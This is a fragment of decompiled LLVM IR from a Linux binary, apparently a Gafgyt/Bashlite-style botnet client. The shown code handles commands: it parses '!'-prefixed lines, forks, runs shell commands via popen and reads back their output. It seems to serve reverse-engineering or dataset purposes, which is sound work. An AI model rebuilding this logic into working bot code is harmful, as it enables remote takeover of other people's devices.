
dec_label_pc_8050fbb:                             ; preds = %dec_label_pc_8050f7e
  %v6_8050fc7 = icmp ugt i32 %v2_8050f89, %v0_8050f97
  br i1 %v6_8050fc7, label %dec_label_pc_8050fdb, label %dec_label_pc_8050fc9

dec_label_pc_8050fc9:                             ; preds = %dec_label_pc_8050fbb
  store i32 %v0_8050f92, i32* @edi, align 4
  %v10_8050fcf = icmp ult i32 %storemerge19, %v0_8050f92
  br i1 %v10_8050fcf, label %dec_label_pc_8050dd6, label %dec_label_pc_8050fdb

dec_label_pc_8050fdb:                             ; preds = %dec_label_pc_8050fc9, %dec_label_pc_8050fbb
  %v0_8050fde = load i32, i32* @ebp, align 4
  %v2_8050fde = add i32 %v0_80513af, -5244
  %v3_8050fde = add i32 %v2_8050fde, %v0_8050fde
  %v4_8050fde = inttoptr i32 %v3_8050fde to i8*
  store i8 0, i8* %v4_8050fde, align 1
  %v0_8050fe6 = load i32, i32* @esp, align 4
  store i32 %v2_8051399, i32* %eax.global-to-local, align 4
  %v2_8050fef = add i32 %v0_8050fe6, -16
  %v3_8050fef = inttoptr i32 %v2_8050fef to i32*
  store i32 %v2_8051399, i32* %v3_8050fef, align 4
  %v0_8050ff0 = call i32 @trim()
  %v0_8050ff5 = load i32, i32* @esp, align 4
  %v1_8050ffb = add i32 %v0_8050ff5, 4
  %v2_8050ffb = inttoptr i32 %v1_8050ffb to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8058777.21 to i32), i32* %v2_8050ffb, align 4
  store i32 %v2_8051399, i32* %eax.global-to-local, align 4
  %v3_8051006 = inttoptr i32 %v0_8050ff5 to i32*
  store i32 %v2_8051399, i32* %v3_8051006, align 4
  %v3_8051007 = call i32 @strstr(i32 %v0_8050f97, i8* bitcast (i32* @0 to i8*))
  %v0_805100c = load i32, i32* @esp, align 4
  store i32 %v3_8051007, i32* %edx.global-to-local, align 4
  store i32 %v2_8051399, i32* %eax.global-to-local, align 4
  %v12_8051017 = icmp eq i32 %v3_8051007, %v2_8051399
  %v1_8051019 = icmp eq i1 %v12_8051017, false
  br i1 %v1_8051019, label %dec_label_pc_8051036, label %dec_label_pc_805101b

dec_label_pc_805101b:                             ; preds = %dec_label_pc_8050fdb
  %v0_805101b = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_805101b, i32* %eax.global-to-local, align 4
  %v1_8051023 = add i32 %v0_805100c, 4
  %v2_8051023 = inttoptr i32 %v1_8051023 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805c9c8.910 to i32), i32* %v2_8051023, align 4
  %v0_8051028 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051028 = inttoptr i32 %v0_805100c to i32*
  store i32 %v0_8051028, i32* %v3_8051028, align 4
  %v2_8051029 = call i32 @HackerPrint(i32 %v0_8050f97, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8051029, i32* %eax.global-to-local, align 4
  %v0_805102e = load i32, i32* @esp, align 4
  %v1_805102e = add i32 %v0_805102e, 16
  br label %dec_label_pc_8051399

dec_label_pc_8051036:                             ; preds = %dec_label_pc_8050fdb
  %v1_8051039 = add i32 %v0_805100c, 4
  %v2_8051039 = inttoptr i32 %v1_8051039 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_805c9cd.911 to i32), i32* %v2_8051039, align 4
  store i32 %v2_8051399, i32* %eax.global-to-local, align 4
  %v3_8051044 = inttoptr i32 %v0_805100c to i32*
  store i32 %v2_8051399, i32* %v3_8051044, align 4
  %v3_8051045 = call i32 @strstr(i32 %v0_8050f97, i8* bitcast (i32* @0 to i8*))
  %v0_805104a = load i32, i32* @esp, align 4
  store i32 %v3_8051045, i32* @edx, align 4
  store i32 %v2_8051399, i32* @eax, align 4
  %v12_8051055 = icmp eq i32 %v3_8051045, %v2_8051399
  %v1_8051057 = icmp eq i1 %v12_8051055, false
  br i1 %v1_8051057, label %dec_label_pc_8051063, label %dec_label_pc_8051059

dec_label_pc_8051059:                             ; preds = %dec_label_pc_8051036
  %v2_805105c = inttoptr i32 %v0_805104a to i32*
  store i32 0, i32* %v2_805105c, align 4
  %v1_805105e = call i32 @__GI_exit(i32 %v0_8050f97)
  store i32 %v1_805105e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051063

dec_label_pc_8051063:                             ; preds = %dec_label_pc_8051036, %dec_label_pc_8051059
  %v2_805106f = load i8, i8* %tmp172, align 4
  %v3_805106f = zext i8 %v2_805106f to i32
  %v6_805106f = or i32 %v3_805106f, %v5_805106f
  store i32 %v6_805106f, i32* %eax.global-to-local, align 4
  %v10_8051071 = icmp eq i8 %v2_805106f, 33
  %v1_8051073 = icmp eq i1 %v10_8051071, false
  br i1 %v1_8051073, label %dec_label_pc_8051399.outer34.backedge, label %dec_label_pc_8051079

dec_label_pc_8051399.outer34.backedge:            ; preds = %dec_label_pc_8051063, %dec_label_pc_8051097, %dec_label_pc_80511b3
  %stack_var_-64.2.ph35.be = phi i8* [ %v22_8051172, %dec_label_pc_80511b3 ], [ %tmp172, %dec_label_pc_8051097 ], [ %tmp172, %dec_label_pc_8051063 ]
  %v0_80513a5.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051399.outer34

dec_label_pc_8051079:                             ; preds = %dec_label_pc_8051063
  store i32 %v1_805107c, i32* %eax.global-to-local, align 4
  %v2_8051088195 = load i8, i8* %storemerge18194, align 1
  %v3_8051088196 = zext i8 %v2_8051088195 to i32
  %v6_8051088198 = or i32 %v3_8051088196, %v5_805106f
  store i32 %v6_8051088198, i32* %eax.global-to-local, align 4
  %v7_805108a200 = icmp eq i8 %v2_8051088195, 32
  br i1 %v7_805108a200, label %dec_label_pc_8051097, label %dec_label_pc_805108e

dec_label_pc_8051082:                             ; preds = %dec_label_pc_805108e
  %v5_8051082 = add i32 %storemerge18.in201, 1
  %storemerge18 = inttoptr i32 %v5_8051082 to i8*
  store i32 %v5_8051082, i32* %eax.global-to-local, align 4
  %v2_8051088 = load i8, i8* %storemerge18, align 1
  %v3_8051088 = zext i8 %v2_8051088 to i32
  %v5_8051088 = and i32 %v5_8051082, -256
  %v6_8051088 = or i32 %v3_8051088, %v5_8051088
  store i32 %v6_8051088, i32* %eax.global-to-local, align 4
  %v7_805108a = icmp eq i8 %v2_8051088, 32
  br i1 %v7_805108a, label %dec_label_pc_8051097, label %dec_label_pc_805108e

dec_label_pc_805108e:                             ; preds = %dec_label_pc_8051079, %dec_label_pc_8051082
  %v5_8051088203 = phi i32 [ %v5_8051088, %dec_label_pc_8051082 ], [ %v5_805106f, %dec_label_pc_8051079 ]
  %storemerge18202 = phi i8* [ %storemerge18, %dec_label_pc_8051082 ], [ %storemerge18194, %dec_label_pc_8051079 ]
  %storemerge18.in201 = phi i32 [ %v5_8051082, %dec_label_pc_8051082 ], [ %v1_805107c, %dec_label_pc_8051079 ]
  store i32 %storemerge18.in201, i32* %eax.global-to-local, align 4
  %v2_8051091 = load i8, i8* %storemerge18202, align 1
  %v3_8051091 = zext i8 %v2_8051091 to i32
  %v6_8051091 = or i32 %v3_8051091, %v5_8051088203
  store i32 %v6_8051091, i32* %eax.global-to-local, align 4
  %v4_8051093 = icmp eq i8 %v2_8051091, 0
  %v1_8051095 = icmp eq i1 %v4_8051093, false
  br i1 %v1_8051095, label %dec_label_pc_8051082, label %dec_label_pc_8051097

dec_label_pc_8051097:                             ; preds = %dec_label_pc_8051082, %dec_label_pc_805108e, %dec_label_pc_8051079
  %storemerge18.in.lcssa = phi i32 [ %v1_805107c, %dec_label_pc_8051079 ], [ %storemerge18.in201, %dec_label_pc_805108e ], [ %v5_8051082, %dec_label_pc_8051082 ]
  %storemerge18.lcssa = phi i8* [ %storemerge18194, %dec_label_pc_8051079 ], [ %storemerge18202, %dec_label_pc_805108e ], [ %storemerge18, %dec_label_pc_8051082 ]
  %v5_8051088.lcssa = phi i32 [ %v5_805106f, %dec_label_pc_8051079 ], [ %v5_8051088203, %dec_label_pc_805108e ], [ %v5_8051088, %dec_label_pc_8051082 ]
  store i32 %storemerge18.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_805109a = load i8, i8* %storemerge18.lcssa, align 1
  %v3_805109a = zext i8 %v2_805109a to i32
  %v6_805109a = or i32 %v3_805109a, %v5_8051088.lcssa
  store i32 %v6_805109a, i32* %eax.global-to-local, align 4
  %v4_805109c = icmp eq i8 %v2_805109a, 0
  br i1 %v4_805109c, label %dec_label_pc_8051399.outer34.backedge, label %dec_label_pc_80510a4

dec_label_pc_80510a4:                             ; preds = %dec_label_pc_8051097
  store i8 0, i8* %storemerge18.lcssa, align 1
  store i32 %v5_805106f, i32* %eax.global-to-local, align 4
  %v3_80510c8 = call i32 @_strlen(i8* %storemerge18194)
  %v6_80510cf = add i32 %v2_8051399, %v3_80510c8
  %v1_80510d2 = add i32 %v6_80510cf, 2
  store i32 %v1_80510d2, i32* %eax.global-to-local, align 4
  %v5_80510d5 = inttoptr i32 %v1_80510d2 to i8*
  %v1_805110d = and i32 %v1_80510d2, -256
  br label %dec_label_pc_80510ff

dec_label_pc_80510da:                             ; preds = %dec_label_pc_8051127, %dec_label_pc_80510ff
  store i32 %v1_805110d, i32* %eax.global-to-local, align 4
  %v3_80510f1 = call i32 @_strlen(i8* %v5_80510d5)
  %v6_80510f8 = add i32 %v1_80510d2, %v3_80510f1
  %v1_80510fb = add i32 %v6_80510f8, -1
  store i32 %v1_80510fb, i32* %eax.global-to-local, align 4
  %v1_80510fc = inttoptr i32 %v1_80510fb to i8*
  store i8 0, i8* %v1_80510fc, align 1
  br label %dec_label_pc_80510ff

dec_label_pc_80510ff:                             ; preds = %dec_label_pc_80510a4, %dec_label_pc_80510da
  store i32 %v1_805110d, i32* %eax.global-to-local, align 4
  %v3_8051116 = call i32 @_strlen(i8* %v5_80510d5)
  %v6_805111d = add i32 %v1_80510d2, %v3_8051116
  %v1_8051120 = add i32 %v6_805111d, -1
  store i32 %v1_8051120, i32* %eax.global-to-local, align 4
  %v1_8051121 = inttoptr i32 %v1_8051120 to i8*
  %v2_8051121 = load i8, i8* %v1_8051121, align 1
  %v3_8051121 = zext i8 %v2_8051121 to i32
  %v5_8051121 = and i32 %v1_8051120, -256
  %v6_8051121 = or i32 %v3_8051121, %v5_8051121
  store i32 %v6_8051121, i32* %eax.global-to-local, align 4
  %v10_8051123 = icmp eq i8 %v2_8051121, 10
  br i1 %v10_8051123, label %dec_label_pc_80510da, label %dec_label_pc_8051127

dec_label_pc_8051127:                             ; preds = %dec_label_pc_80510ff
  store i32 %v1_805110d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_80510d2, i32* @edi, align 4
  %v3_805113e = call i32 @_strlen(i8* %v5_80510d5)
  %v4_805113e = mul i32 %v3_805113e, -1
  %v5_805113e = add i32 %v4_805113e, -2
  store i32 %v5_805113e, i32* @ecx, align 4
  %v6_8051145 = sub i32 %v1_80510d2, %v4_805113e
  %v1_8051148 = add i32 %v6_8051145, -1
  store i32 %v1_8051148, i32* %eax.global-to-local, align 4
  %v1_8051149 = inttoptr i32 %v1_8051148 to i8*
  %v2_8051149 = load i8, i8* %v1_8051149, align 1
  %v3_8051149 = zext i8 %v2_8051149 to i32
  %v5_8051149 = and i32 %v1_8051148, -256
  %v6_8051149 = or i32 %v3_8051149, %v5_8051149
  store i32 %v6_8051149, i32* %eax.global-to-local, align 4
  %v10_805114b = icmp eq i8 %v2_8051149, 13
  br i1 %v10_805114b, label %dec_label_pc_80510da, label %dec_label_pc_805114f

dec_label_pc_805114f:                             ; preds = %dec_label_pc_8051127
  store i32 %v1_80510d2, i32* %eax.global-to-local, align 4
  %v2_805115d210 = load i8, i8* %v5_80510d5, align 1
  %v3_805115d211 = zext i8 %v2_805115d210 to i32
  %v6_805115d213 = or i32 %v3_805115d211, %v1_805110d
  store i32 %v6_805115d213, i32* %eax.global-to-local, align 4
  %v7_805115f215 = icmp eq i8 %v2_805115d210, 32
  br i1 %v7_805115f215, label %dec_label_pc_805116c, label %dec_label_pc_8051163

dec_label_pc_8051157:                             ; preds = %dec_label_pc_8051163
  %v5_8051157 = add i32 %v4_805115a217, 1
  %v22_8051157 = inttoptr i32 %v5_8051157 to i8*
  store i32 %v5_8051157, i32* %eax.global-to-local, align 4
  %v2_805115d = load i8, i8* %v22_8051157, align 1
  %v3_805115d = zext i8 %v2_805115d to i32
  %v5_805115d = and i32 %v5_8051157, -256
  %v6_805115d = or i32 %v3_805115d, %v5_805115d
  store i32 %v6_805115d, i32* %eax.global-to-local, align 4
  %v7_805115f = icmp eq i8 %v2_805115d, 32
  br i1 %v7_805115f, label %dec_label_pc_805116c, label %dec_label_pc_8051163

dec_label_pc_8051163:                             ; preds = %dec_label_pc_805114f, %dec_label_pc_8051157
  %v5_805115d218 = phi i32 [ %v5_805115d, %dec_label_pc_8051157 ], [ %v1_805110d, %dec_label_pc_805114f ]
  %v4_805115a217 = phi i32 [ %v5_8051157, %dec_label_pc_8051157 ], [ %v1_80510d2, %dec_label_pc_805114f ]
  %stack_var_-64.1216 = phi i8* [ %v22_8051157, %dec_label_pc_8051157 ], [ %v5_80510d5, %dec_label_pc_805114f ]
  store i32 %v4_805115a217, i32* %eax.global-to-local, align 4
  %v2_8051166 = load i8, i8* %stack_var_-64.1216, align 1
  %v3_8051166 = zext i8 %v2_8051166 to i32
  %v6_8051166 = or i32 %v3_8051166, %v5_805115d218
  store i32 %v6_8051166, i32* %eax.global-to-local, align 4
  %v4_8051168 = icmp eq i8 %v2_8051166, 0
  %v1_805116a = icmp eq i1 %v4_8051168, false
  br i1 %v1_805116a, label %dec_label_pc_8051157, label %dec_label_pc_805116c

dec_label_pc_805116c:                             ; preds = %dec_label_pc_8051157, %dec_label_pc_8051163, %dec_label_pc_805114f
  %stack_var_-64.1.lcssa = phi i8* [ %v5_80510d5, %dec_label_pc_805114f ], [ %stack_var_-64.1216, %dec_label_pc_8051163 ], [ %v22_8051157, %dec_label_pc_8051157 ]
  %v4_805115a.lcssa = phi i32 [ %v1_80510d2, %dec_label_pc_805114f ], [ %v4_805115a217, %dec_label_pc_8051163 ], [ %v5_8051157, %dec_label_pc_8051157 ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_8051172 = add i32 %v4_805115a.lcssa, 1
  store i32 %v1_80510d2, i32* %eax.global-to-local, align 4
  %v2_80511a0224 = load i8, i8* %v5_80510d5, align 1
  %v3_80511a0225 = zext i8 %v2_80511a0224 to i32
  %v6_80511a0227 = or i32 %v3_80511a0225, %v1_805110d
  store i32 %v6_80511a0227, i32* %eax.global-to-local, align 4
  %v4_80511a2228 = icmp eq i8 %v2_80511a0224, 0
  %v1_80511a4229 = icmp eq i1 %v4_80511a2228, false
  br i1 %v1_80511a4229, label %dec_label_pc_805117d, label %dec_label_pc_80511a6

dec_label_pc_805117d:                             ; preds = %dec_label_pc_805116c, %dec_label_pc_805117d
  %v4_805119d231 = phi i32 [ %v5_805119a, %dec_label_pc_805117d ], [ %v1_80510d2, %dec_label_pc_805116c ]
  %storemerge17230 = phi i8* [ %v22_805119a, %dec_label_pc_805117d ], [ %v5_80510d5, %dec_label_pc_805116c ]
  store i32 %v4_805119d231, i32* %eax.global-to-local, align 4
  %v2_8051180 = load i8, i8* %storemerge17230, align 1
  %v3_8051180 = zext i8 %v2_8051180 to i32
  store i32 %v3_8051180, i32* %eax.global-to-local, align 4
  %v0_8051187 = load i32, i32* @esp, align 4
  %v2_805118a = add i32 %v0_8051187, -16
  %v3_805118a = inttoptr i32 %v2_805118a to i32*
  store i32 %v3_8051180, i32* %v3_805118a, align 4
  %v2_805118b = call i32 @__GI_toupper(i32 %v4_805119d231)
  %v1_8051193 = urem i32 %v2_805118b, 256
  %v2_8051193 = load i32, i32* @edx, align 4
  %v3_8051193 = and i32 %v2_8051193, -256
  %v4_8051193 = or i32 %v3_8051193, %v1_8051193
  store i32 %v4_8051193, i32* @edx, align 4
  %v1_8051198 = trunc i32 %v2_805118b to i8
  store i8 %v1_8051198, i8* %storemerge17230, align 1
  %v5_805119a = add i32 %v4_805119d231, 1
  %v22_805119a = inttoptr i32 %v5_805119a to i8*
  store i32 %v5_805119a, i32* %eax.global-to-local, align 4
  %v2_80511a0 = load i8, i8* %v22_805119a, align 1
  %v3_80511a0 = zext i8 %v2_80511a0 to i32
  %v5_80511a0 = and i32 %v5_805119a, -256
  %v6_80511a0 = or i32 %v3_80511a0, %v5_80511a0
  store i32 %v6_80511a0, i32* %eax.global-to-local, align 4
  %v4_80511a2 = icmp eq i8 %v2_80511a0, 0
  %v1_80511a4 = icmp eq i1 %v4_80511a2, false
  br i1 %v1_80511a4, label %dec_label_pc_805117d, label %dec_label_pc_80511a6

dec_label_pc_80511a6:                             ; preds = %dec_label_pc_805117d, %dec_label_pc_805116c
  %storemerge17.lcssa = phi i8* [ %v5_80510d5, %dec_label_pc_805116c ], [ %v22_805119a, %dec_label_pc_805117d ]
  %v4_805119d.lcssa = phi i32 [ %v1_80510d2, %dec_label_pc_805116c ], [ %v5_805119a, %dec_label_pc_805117d ]
  %v22_8051172 = inttoptr i32 %v5_8051172 to i8*
  store i32 %v1_80510d2, i32* %eax.global-to-local, align 4
  %v2_80511a9 = load i8, i8* %v5_80510d5, align 1
  %v3_80511a9 = zext i8 %v2_80511a9 to i32
  %v6_80511a9 = or i32 %v3_80511a9, %v1_805110d
  store i32 %v6_80511a9, i32* %eax.global-to-local, align 4
  %v4_80511ab = icmp eq i8 %v2_80511a9, 0
  %v1_80511ad = icmp eq i1 %v4_80511ab, false
  br i1 %v1_80511ad, label %dec_label_pc_8051285, label %dec_label_pc_80511b3

dec_label_pc_80511b3:                             ; preds = %dec_label_pc_80511a6
  %v0_80511b3 = call i32 @listFork()
  store i32 %v0_80511b3, i32* %eax.global-to-local, align 4
  %v1_80511b8 = icmp eq i32 %v0_80511b3, 0
  %v1_80511ba = icmp eq i1 %v1_80511b8, false
  br i1 %v1_80511ba, label %dec_label_pc_8051399.outer34.backedge, label %dec_label_pc_80511c0

dec_label_pc_80511c0:                             ; preds = %dec_label_pc_80511b3
  store i32 %v2_80511c0, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_80511cd = load i32, i32* @esp, align 4
  %v2_80511d0 = add i32 %v0_80511cd, -8
  %v3_80511d0 = inttoptr i32 %v2_80511d0 to i32*
  store i32 1024, i32* %v3_80511d0, align 4
  %v1_80511d1 = add i32 %v0_80511cd, -12
  %v2_80511d1 = inttoptr i32 %v1_80511d1 to i32*
  store i32 0, i32* %v2_80511d1, align 4
  %v2_80511d3 = add i32 %v0_80511cd, -16
  %v3_80511d3 = inttoptr i32 %v2_80511d3 to i32*
  store i32 %v2_80511c0, i32* %v3_80511d3, align 4
  %v3_80511d4 = load i8*, i8** %stack_var_-36, align 4
  %v4_80511d4 = ptrtoint i8* %v3_80511d4 to i32
  %v6_80511d4 = call i32 @__GI_memset(i8* %storemerge17.lcssa, i32 %stack_var_-40.3.ph30, i32 %v4_80511d4)
  %v0_80511d9 = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805c9d1.912 to i32), i32* %eax.global-to-local, align 4
  %v6_80511e4 = add i32 %v0_80511d9, 8
  %v7_80511e4 = inttoptr i32 %v6_80511e4 to i32*
  store i32 %v5_8051172, i32* %v7_80511e4, align 4
  %v0_80511e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80511e7 = add i32 %v0_80511d9, 4
  %v3_80511e7 = inttoptr i32 %v2_80511e7 to i32*
  store i32 %v0_80511e7, i32* %v3_80511e7, align 4
  store i32 %v2_80511c0, i32* %eax.global-to-local, align 4
  %v3_80511ee = inttoptr i32 %v0_80511d9 to i32*
  store i32 %v2_80511c0, i32* %v3_80511ee, align 4
  %v3_80511ef = load i8*, i8** %stack_var_-36, align 4
  %v4_80511ef = ptrtoint i8* %v3_80511ef to i32
  %v6_80511ef = call i32 @szprintf(i32 %v4_805119d.lcssa, i32 %stack_var_-40.3.ph30, i32 %v4_80511ef, i32 %stack_var_-32.2.ph31)
  %v0_80511f4 = load i32, i32* @esp, align 4
  %v2_80511ff = add i32 %v0_80511f4, 4
  %v3_80511ff = inttoptr i32 %v2_80511ff to i32*
  store i32 ptrtoint (i32* @global_var_805c9d9.913 to i32), i32* %v3_80511ff, align 4
  store i32 %v2_80511c0, i32* @eax, align 4
  %v3_8051206 = inttoptr i32 %v0_80511f4 to i32*
  store i32 %v2_80511c0, i32* %v3_8051206, align 4
  %v0_8051207 = call i32 @fdpopen()
  store i32 %v0_8051207, i32* %eax.global-to-local, align 4
  %v3_805123a = inttoptr i32 %v0_8051207 to i8*
  br label %dec_label_pc_805124f

dec_label_pc_8051214:                             ; preds = %dec_label_pc_805124f
  store i32 %v2_80511c0, i32* %eax.global-to-local, align 4
  %v3_805121d = inttoptr i32 %v0_8051266 to i32*
  store i32 %v2_80511c0, i32* %v3_805121d, align 4
  %v0_805121e = call i32 @trim()
  %v0_8051223 = load i32, i32* @esp, align 4
  store i32 %v2_80511c0, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_8051236 = add i32 %v0_8051223, 8
  %v3_8051236 = inttoptr i32 %v2_8051236 to i32*
  store i32 1024, i32* %v3_8051236, align 4
  %v1_8051237 = add i32 %v0_8051223, 4
  %v2_8051237 = inttoptr i32 %v1_8051237 to i32*
  store i32 0, i32* %v2_8051237, align 4
  %v3_8051239 = inttoptr i32 %v0_8051223 to i32*
  store i32 %v2_80511c0, i32* %v3_8051239, align 4
  %v4_805123a = call i32 @__GI_memset(i8* %v3_805123a, i32 %stack_var_-28.1.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805123a, i32* %eax.global-to-local, align 4
  %v0_805123f = load i32, i32* @esp, align 4
  %v2_8051245 = inttoptr i32 %v0_805123f to i32*
  store i32 1, i32* %v2_8051245, align 4
  %v1_8051247 = call i32 @sleep(i32 %v0_8051207)
  store i32 %v1_8051247, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805124f

dec_label_pc_805124f:                             ; preds = %dec_label_pc_80511c0, %dec_label_pc_8051214
  %storemerge26.in.in = load i32, i32* @esp, align 4
  %v5_8051252 = add i32 %storemerge26.in.in, 8
  %v6_8051252 = inttoptr i32 %v5_8051252 to i32*
  store i32 %v0_8051207, i32* %v6_8051252, align 4
  %v1_8051255 = add i32 %storemerge26.in.in, 4
  %v2_8051255 = inttoptr i32 %v1_8051255 to i32*
  store i32 1024, i32* %v2_8051255, align 4
  store i32 %v2_80511c0, i32* %eax.global-to-local, align 4
  %v3_8051260 = inttoptr i32 %storemerge26.in.in to i32*
  store i32 %v2_80511c0, i32* %v3_8051260, align 4
  %v3_8051261 = call i32 @fdgets(i32 %v0_8051207, i32 %stack_var_-28.1.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8051261, i32* %eax.global-to-local, align 4
  %v0_8051266 = load i32, i32* @esp, align 4
  %v1_8051269 = icmp eq i32 %v3_8051261, 0
  %v1_805126b = icmp eq i1 %v1_8051269, false
  br i1 %v1_805126b, label %dec_label_pc_8051214, label %dec_label_pc_805126d

dec_label_pc_805126d:                             ; preds = %dec_label_pc_805124f
  %v6_8051270 = inttoptr i32 %v0_8051266 to i32*
  store i32 %v0_8051207, i32* %v6_8051270, align 4
  %v0_8051273 = call i32 @fdpclose()
  store i32 %v0_8051273, i32* @eax, align 4
  %v0_8051278 = load i32, i32* @esp, align 4
  %v2_805127e = inttoptr i32 %v0_8051278 to i32*
  store i32 0, i32* %v2_805127e, align 4
  %v1_8051280 = call i32 @__GI_exit(i32 %v0_8051207)
  store i32 %v1_8051280, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051285

dec_label_pc_8051285:                             ; preds = %dec_label_pc_80511a6, %dec_label_pc_805126d
  %stack_var_-32.1 = phi i32 [ %v0_8051207, %dec_label_pc_805126d ], [ %stack_var_-32.2.ph31, %dec_label_pc_80511a6 ]
  store i32 %v5_8051172, i32* @eax, align 4
  %v0_805128f = load i32, i32* @esp, align 4
  %v1_8051292 = add i32 %v0_805128f, -12
  %v2_8051292 = inttoptr i32 %v1_8051292 to i32*
  store i32 ptrtoint (i32* @global_var_805c9db.914 to i32), i32* %v2_8051292, align 4
  %v0_8051297 = load i32, i32* @eax, align 4
  %v2_8051297 = add i32 %v0_805128f, -16
  %v3_8051297 = inttoptr i32 %v2_8051297 to i32*
  store i32 %v0_8051297, i32* %v3_8051297, align 4
  %v1_8051298 = load i8*, i8** %stack_var_-36, align 4
  %v2_8051298 = ptrtoint i8* %v1_8051298 to i32
  %v3_8051298 = call i32 @__GI_strtok(i32 1, i32 %v2_8051298)
  %v0_805129d = load i32, i32* @esp, align 4
  %v1_805129d = add i32 %v0_805129d, 16
  %v5_80512a0 = inttoptr i32 %v3_8051298 to i8*
  store i8* %v5_80512a0, i8** %stack_var_-36, align 4
  store i32 %v1_80510d2, i32* %eax.global-to-local, align 4
  store i8* %v5_80510d5, i8** %stack_var_-132, align 4
  %v5_805134966 = icmp eq i32 %v3_8051298, 0
  %v1_805134d73 = icmp eq i1 %v5_805134966, false
  br i1 %v1_805134d73, label %dec_label_pc_80512ae, label %dec_label_pc_8051353

dec_label_pc_80512ae:                             ; preds = %dec_label_pc_8051285, %dec_label_pc_8051334
  %v0_805133499 = phi i32 [ %v1_8051343, %dec_label_pc_8051334 ], [ %v1_805129d, %dec_label_pc_8051285 ]
  %v3_80512ba = phi i8* [ %tmp175, %dec_label_pc_8051334 ], [ %v5_80512a0, %dec_label_pc_8051285 ]
  %stack_var_-40.274 = phi i32 [ %stack_var_-40.1, %dec_label_pc_8051334 ], [ 1, %dec_label_pc_8051285 ]
  %v4_80512ae = ptrtoint i8* %v3_80512ba to i32
  store i32 %v4_80512ae, i32* %eax.global-to-local, align 4
  %v2_80512b1 = load i8, i8* %v3_80512ba, align 1
  %v3_80512b1 = zext i8 %v2_80512b1 to i32
  %v5_80512b1 = and i32 %v4_80512ae, -256
  %v6_80512b1 = or i32 %v3_80512b1, %v5_80512b1
  store i32 %v6_80512b1, i32* @eax, align 4
  %v10_80512b3 = icmp eq i8 %v2_80512b1, 10
  br i1 %v10_80512b3, label %dec_label_pc_8051334, label %dec_label_pc_80512b7

dec_label_pc_80512b7:                             ; preds = %dec_label_pc_80512ae
  store i32 %stack_var_-40.274, i32* @ebx, align 4
  store i32 %v5_80512b1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_80512ae, i32* @edi, align 4
  %v3_80512d1 = call i32 @_strlen(i8* %v3_80512ba)
  %v1_80512d5 = add i32 %v3_80512d1, 1
  store i32 %v1_80512d5, i32* %eax.global-to-local, align 4
  %v0_80512d9 = load i32, i32* @esp, align 4
  %v2_80512dc = add i32 %v0_80512d9, -16
  %v3_80512dc = inttoptr i32 %v2_80512dc to i32*
  store i32 %v1_80512d5, i32* %v3_80512dc, align 4
  %v2_80512dd = call i32 @malloc(i32 %v4_80512ae)
  %v1_80512e5 = load i32, i32* @ebp, align 4
  %v2_80512e5 = load i32, i32* @ebx, align 4
  %v3_80512e5 = mul i32 %v2_80512e5, 4
  %v4_80512e5 = add i32 %v1_80512e5, -124
  %v5_80512e5 = add i32 %v4_80512e5, %v3_80512e5
  %v6_80512e5 = inttoptr i32 %v5_80512e5 to i32*
  store i32 %v2_80512dd, i32* %v6_80512e5, align 4
  %v3_80512e9 = load i8*, i8** %stack_var_-36, align 4
  %v4_80512e9 = ptrtoint i8* %v3_80512e9 to i32
  %v1_80512f7 = and i32 %v4_80512e9, -256
  store i32 %v1_80512f7, i32* %eax.global-to-local, align 4
  %v3_8051300 = call i32 @_strlen(i8* %v3_80512e9)
  %v1_8051304 = add i32 %v3_8051300, 1
  store i32 %v1_8051304, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.274, i32* %eax.global-to-local, align 4
  %v0_805130d = load i32, i32* @ebp, align 4
  %v2_805130d = mul i32 %stack_var_-40.274, 4
  %v3_805130d = add i32 %v2_805130d, -124
  %v4_805130d = add i32 %v0_805130d, %v3_805130d
  %v5_805130d = inttoptr i32 %v4_805130d to i32*
  %v6_805130d = load i32, i32* %v5_805130d, align 4
  %v1_8051311 = inttoptr i32 %v6_805130d to i8*
  store i32 %v6_805130d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8051316 = and i32 %v6_805130d, -256
  store i32 %v1_8051316, i32* %eax.global-to-local, align 4
  %v5_8051318 = call i8* @_memset(i8* %v1_8051311, i32 %v1_8051316, i32 %v1_8051304)
  %v6_8051318 = ptrtoint i8* %v5_8051318 to i32
  store i32 %v6_8051318, i32* @ecx, align 4
  store i32 %v4_80512e9, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.274, i32* %eax.global-to-local, align 4
  %v0_8051320 = load i32, i32* @ebp, align 4
  %v4_8051320 = add i32 %v0_8051320, %v3_805130d
  %v5_8051320 = inttoptr i32 %v4_8051320 to i32*
  %v6_8051320 = load i32, i32* %v5_8051320, align 4
  store i32 %v6_8051320, i32* @eax, align 4
  %v0_8051324 = load i32, i32* @esp, align 4
  %v2_8051327 = add i32 %v0_8051324, -12
  %v3_8051327 = inttoptr i32 %v2_8051327 to i32*
  store i32 %v4_80512e9, i32* %v3_8051327, align 4
  %v0_8051328 = load i32, i32* @eax, align 4
  %v2_8051328 = add i32 %v0_8051324, -16
  %v3_8051328 = inttoptr i32 %v2_8051328 to i32*
  store i32 %v0_8051328, i32* %v3_8051328, align 4
  %v5_8051329 = call i32 @strcpy(i8* %v3_80512e9, i32 %v4_80512ae)
  store i32 %v5_8051329, i32* @eax, align 4
